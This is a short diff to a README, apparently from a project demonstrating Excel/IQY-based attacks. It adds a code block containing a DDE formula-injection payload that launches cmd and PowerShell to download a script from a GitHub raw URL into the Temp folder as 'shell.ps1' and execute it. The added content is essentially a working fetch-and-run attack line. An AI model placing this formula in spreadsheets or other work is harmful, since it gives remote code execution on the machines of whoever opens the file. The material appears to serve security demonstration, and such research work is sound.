@@ -519,6 +519,8 @@ Once the script is executed.. ups!
   <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/2018-09-28_123822.png"/>
 </p>
 
-
+```
+=cmd|' /C powershell Invoke-WebRequest "https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/examples/pcinfo.ps1" -OutFile "$env:Temp\shell.ps1"; powershell -file "$env:Temp\shell.ps1"'!notthissheet
+```
 
 
